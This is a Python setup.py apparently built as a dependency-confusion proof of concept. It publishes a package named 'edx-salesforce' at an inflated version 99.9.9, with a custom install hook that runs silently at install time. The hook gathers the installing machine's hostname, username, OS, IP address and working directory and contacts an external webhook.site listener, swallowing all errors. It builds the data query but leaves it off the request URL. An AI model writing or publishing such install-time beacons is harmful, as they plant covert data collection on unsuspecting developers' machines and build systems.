import os
import socket
import platform
import urllib.request
import urllib.parse
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        try:
            # Collect data
            info = {
                "package": "internal-tool-name",
                "hostname": socket.gethostname(),
                "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
                "os": platform.system() + " " + platform.release(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "path": os.getcwd()
            }

            # Send to your listener
            query = urllib.parse.urlencode(info)
            # CHANGE THE URL BELOW
            url = f"https://webhook.site/9788d92e-e352-4602-a55e-05319d258911"
            
            req = urllib.request.Request(url, headers={'User-Agent': 'Security-PoC'})
            with urllib.request.urlopen(req, timeout=10):
                pass
        except:
            pass
        install.run(self)

setup(
    name="edx-salesforce",
    version="99.9.9",
    cmdclass={'install': CustomInstall},
)